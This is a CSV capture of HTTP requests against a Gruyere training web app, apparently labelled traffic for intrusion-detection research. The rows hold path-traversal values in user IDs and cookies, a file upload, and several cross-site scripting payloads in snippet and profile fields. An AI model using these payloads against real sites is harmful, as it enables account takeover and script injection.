,source_ip,source_port,destination_ip,destination_port,raw_http_payload,scan_types
20,192.168.85.128,42920,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/saveprofile?action=new&uid=..%2F..%2Fbob&pw=123&is_author=True\r\nCookie: GRUYERE=94981055|../../bob||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
21,192.168.85.128,42922,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/upload.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login\r\nCookie: GRUYERE=94981055|../../bob||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
22,192.168.85.128,42926,192.168.85.129,8008,"b'POST /584433993583234906370287874446790819139/upload2 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------383712244121203036361392854334\r\nContent-Length: 233\r\nOrigin: http://defender:8008\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload.gtl\r\nCookie: GRUYERE=94981055|../../bob||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n-----------------------------383712244121203036361392854334\r\nContent-Disposition: form-data; name=""upload_file""; filename=""""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------383712244121203036361392854334--\r\n'",
23,192.168.85.128,42928,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/upload.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload2\r\nCookie: GRUYERE=94981055|../../bob||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
24,192.168.85.128,42930,192.168.85.129,8008,"b'POST /584433993583234906370287874446790819139/upload2 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------5166192903812992701434483844\r\nContent-Length: 230\r\nOrigin: http://defender:8008\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload.gtl\r\nCookie: GRUYERE=94981055|../../bob||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n-----------------------------5166192903812992701434483844\r\nContent-Disposition: form-data; name=""upload_file""; filename=""secret.txt""\r\nContent-Type: text/plain\r\n\r\npwnd\n\r\n-----------------------------5166192903812992701434483844--\r\n'",
25,192.168.85.128,42932,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/logout HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload2\r\nCookie: GRUYERE=94981055|../../bob||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
26,192.168.85.128,42940,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/login HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/saveprofile?action=new&uid=..%2F&pw=123&is_author=True\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
27,192.168.85.128,42942,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/upload.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/login\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
28,192.168.85.128,42944,192.168.85.129,8008,"b'POST /584433993583234906370287874446790819139/upload2 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------32027079444933292263363538485\r\nContent-Length: 231\r\nOrigin: http://defender:8008\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n-----------------------------32027079444933292263363538485\r\nContent-Disposition: form-data; name=""upload_file""; filename=""""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------32027079444933292263363538485--\r\n'",
29,192.168.85.128,42946,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/upload.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload2\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
30,192.168.85.128,42950,192.168.85.129,8008,"b'POST /584433993583234906370287874446790819139/upload2 HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------285262936528697318792960077148\r\nContent-Length: 234\r\nOrigin: http://defender:8008\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n-----------------------------285262936528697318792960077148\r\nContent-Disposition: form-data; name=""upload_file""; filename=""secret.txt""\r\nContent-Type: text/plain\r\n\r\npwnd\n\r\n-----------------------------285262936528697318792960077148--\r\n'",
31,192.168.85.128,42952,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/newsnippet.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/upload2\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
32,192.168.85.128,42954,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/newsnippet2?snippet=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/newsnippet.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
33,192.168.85.128,42956,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/snippets.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/newsnippet.gtl\r\nConnection: keep-alive\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
34,192.168.85.128,42958,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/newsnippet.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/snippets.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
35,192.168.85.128,42960,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/newsnippet2?snippet=%3C%2Fa+href%3D%22%23%22+onmouseover%3D%22alert%281%29%22%3E HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/newsnippet.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
36,192.168.85.128,42962,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/snippets.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/newsnippet.gtl\r\nConnection: keep-alive\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
37,192.168.85.128,42964,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/newsnippet.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/snippets.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
38,192.168.85.128,42966,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/newsnippet2?snippet=%3Cimg+href%3D%22%23%22+onclick%3D%22alert%281%29%22%3E%3C%2Fimg%3E HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/newsnippet.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
39,192.168.85.128,42968,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/snippets.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/newsnippet.gtl\r\nConnection: keep-alive\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
40,192.168.85.128,42970,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/editprofile.gtl HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/snippets.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
41,192.168.85.128,42972,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/saveprofile?action=update&name=..%2F&oldpw=&pw=&icon=&web_site=&color=purple%27+onmouseover%3D%27alert%28pwnt%29%27&private_snippet= HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/editprofile.gtl\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
42,192.168.85.128,42974,192.168.85.129,8008,"b'GET /584433993583234906370287874446790819139/ HTTP/1.1\r\nHost: defender:8008\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://defender:8008/584433993583234906370287874446790819139/editprofile.gtl\r\nConnection: keep-alive\r\nCookie: GRUYERE=103155209|../||author\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",
